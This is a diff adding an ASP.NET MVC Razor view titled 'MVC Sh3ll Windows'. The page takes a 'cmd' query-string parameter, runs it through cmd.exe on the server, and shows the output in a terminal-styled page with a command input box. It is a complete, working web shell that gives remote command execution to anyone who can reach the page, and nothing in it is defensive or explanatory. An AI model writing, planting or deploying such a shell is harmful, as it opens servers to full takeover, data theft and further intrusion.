@@ -1,0 +1,138 @@
+﻿@using System
+@using System.Diagnostics
+
+@{ 
+    ViewData["Title"] = "MVC Sh3ll Windows";
+    var result = "";
+    var cmd = Context.Request.Query["cmd"];
+    if (!String.IsNullOrEmpty(cmd)){
+        result = Bash(cmd);
+    }
+
+    if (String.IsNullOrEmpty(result)){
+        result = "Invalid command or something didn't work";
+    }
+
+}
+
+@functions{
+    public static string Bash (string cmd)
+    {
+        var result = "";
+        var escapedArgs = cmd.Replace("\"", "\\\"");
+        var process = new Process()
+        {
+            StartInfo = new ProcessStartInfo
+            {
+                FileName = "cmd.exe",
+                Arguments = $"/C \"{escapedArgs}\"",
+                RedirectStandardOutput = true,
+                UseShellExecute = false,
+                CreateNoWindow = true,
+            }
+        };
+
+        process.Start();
+        result = process.StandardOutput.ReadToEnd();
+        process.WaitForExit();
+
+        return result;
+    }
+}
+
+
+
+<script
+  src="https://code.jquery.com/jquery-3.2.1.min.js"
+  integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4="
+  crossorigin="anonymous"></script>
+<script>
+$(function() {
+    var cmdResult = $("#cmdResult");
+
+	console.log(cmdResult);
+
+	if (cmdResult.text() === "Invalid command or something didn't work"){
+	    console.log("should change text");
+        cmdResult.css("color", "red");
+	}
+	
+	var term = $("#console");
+    $("#cmd").focus();
+	term.scrollTop(term.prop("scrollHeight"));
+	
+	$.urlParam = function(name){
+        var results = new RegExp('[\?&]' + name + '=([^&#]*)').exec(window.location.href);
+        if (results==null){
+           return null;
+        }
+        else{
+           return decodeURI(results[1]) || 0;
+        }
+    }
+
+	
+	function executeCmd(){
+        var cmd = encodeURIComponent($("#cmd").val());
+	    var currentCmd = $.urlParam('cmd');
+	    console.log("should replace: " + currentCmd + " WITH: " + cmd);
+
+	    var currentUrl = location.href;
+
+	    var paramDelimeter = "";
+	    if (currentUrl.indexOf("?") < 0){
+	        paramDelimeter = "?";
+	    } else {
+	        paramDelimeter = "&";
+	    }
+        
+	    if (currentUrl.indexOf("cmd=") < 0){
+            currentUrl = location.href + paramDelimeter + "cmd=";
+	    }
+	
+        var newUrl = currentUrl.replace(/cmd=.*/, "cmd="+cmd);
+        window.location.href = newUrl;
+
+	    //console.log(newUrl);
+	}
+	
+    $("#submitCommand").click(function(){
+	    executeCmd();
+	})
+
+	$("#cmd").keypress(function (e) {
+	    if (e.which == 13) {
+	        executeCmd();
+	        return false;
+	    }
+	});
+
+	$("#cmd").on("change paste keyup", function(theVal){
+	    var cmd = $("#cmd").val();
+	    $("#cmdInput").text(cmd);
+	});
+});
+
+</script>
+
+
+<h3>@ViewData["Title"].</h3>
+<h4>@ViewData["Message"]</h4>
+<h4>Output for:> <span style="font-family: monospace; font-weight: normal;">@cmd</span></h4>
+
+
+<pre id="console" style="color: #00ff00;background-color: #141414;max-height: 606px;">
+C#:>@cmd
+	
+<span id="cmdResult">@result</span>
+	
+C#:><span id="cmdInput"></span>
+</pre>
+
+<br />
+
+<p>Enter your command below:</p>
+<span style="display: inline-flex !important;">
+    <input  id="cmd" class="form-control" type="text" style="width: 400px;" /> 
+	<button id="submitCommand" class="btn btn-primary">Send!</button>
+</span>
